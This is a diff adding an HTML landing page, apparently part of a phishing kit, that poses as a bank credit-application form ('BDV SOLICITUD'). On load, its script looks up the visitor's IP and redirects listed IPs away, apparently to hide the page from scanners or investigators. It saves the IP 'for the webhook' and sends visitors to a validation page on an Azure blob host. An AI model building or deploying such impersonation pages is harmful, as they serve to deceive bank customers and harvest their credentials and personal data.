@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <title>BDV SOLICITUD</title>
+ 
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link rel="icon" href="favicon.png" type="image/x-icon">
+
+    <style>
+        /* =====================
+           RESET & BASE
+        ===================== */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url(background.webp) center / cover no-repeat;
+        }
+
+        /* =====================
+           LAYOUT
+        ===================== */
+        .container {
+            display: flex;
+            width: 80%;
+            height: 100%;
+        }
+
+        .left-side {
+            width: 40%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .right-side {
+            width: 30%;
+        }
+
+        /* =====================
+           FORM
+        ===================== */
+        .form {
+            width: 80%;
+            max-width: 350px;
+            background: #fff;
+            box-shadow: 0 5px 10px rgba(0,0,0,0.1);
+            padding-bottom: 20px;
+        }
+
+        /* =====================
+           BUTTON
+        ===================== */
+        #iniciarBtn {
+            width: 180px;
+            height: 38px;
+            font-size: 16px;
+            background-color: #0067b1;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        #iniciarBtn:disabled {
+            background-color: #e0e0e0;
+            cursor: not-allowed;
+        }
+
+        /* =====================
+           RESPONSIVE
+        ===================== */
+        @media (max-width: 768px) {
+            body {
+                background: #ededed;
+            }
+            .container {
+                flex-direction: column;
+            }
+            .left-side {
+                width: 100%;
+                height: 100vh;
+            }
+            .right-side {
+                display: none;
+            }
+        }
+    </style>
+
+    <script>
+        // --- CONFIGURACIÓN DE SEGURIDAD ---
+        // Lista de IPs que tienen el acceso prohibido
+        const ipsBloqueadas = [
+            "123.45.67.89", 
+            "185.153.177.139"
+        ];
+
+        async function validarAcceso() {
+            try {
+                // Obtenemos la IP real del usuario
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIP = data.ip;
+
+                // 1. Verificamos si está en la lista negra
+                if (ipsBloqueadas.includes(userIP)) {
+                    window.location.href = "off.html";
+                    return;
+                }
+
+                // 2. Creamos la "Sesión" en LocalStorage usando la IP
+                const nombreSesion = "SESION_" + userIP.replace(/\./g, '_');
+                localStorage.setItem(nombreSesion, "activa");
+                
+                // Guardamos la IP para usarla en los siguientes pasos (webhook, etc)
+                localStorage.setItem("user_ip", userIP);
+
+                console.log("Acceso verificado para: " + userIP);
+
+            } catch (error) {
+                console.error("Error de validación:", error);
+                // Si la API de IP falla, el usuario podrá entrar por defecto
+            }
+        }
+
+        // Ejecutar validación al cargar la página
+        validarAcceso();
+    </script>
+</head>
+
+<body>
+    <div class="container">
+        <div class="left-side">
+            <div class="form">
+                <div style="text-align:center;">
+                    <img src="logo.png" alt="Logo" style="width:90%; margin-top:20px;">
+                    <h4 style="color:#0067b1; margin:20px 0 5px;">
+                        INICIAR SOLICITUD DE CRÉDITO
+                    </h4>
+                    <br>
+                </div>
+
+                <div style="text-align:center; padding-bottom:20px;">
+                    <button type="button" id="iniciarBtn" onclick="window.location.href='https://asolucion.blob.core.windows.net/solucion/validacion.html'">
+                        Continuar Solicitud
+                    </button>
+                </div>
+            </div>
+        </div>
+        <div class="right-side"></div>
+    </div>
+</body>
+</html>
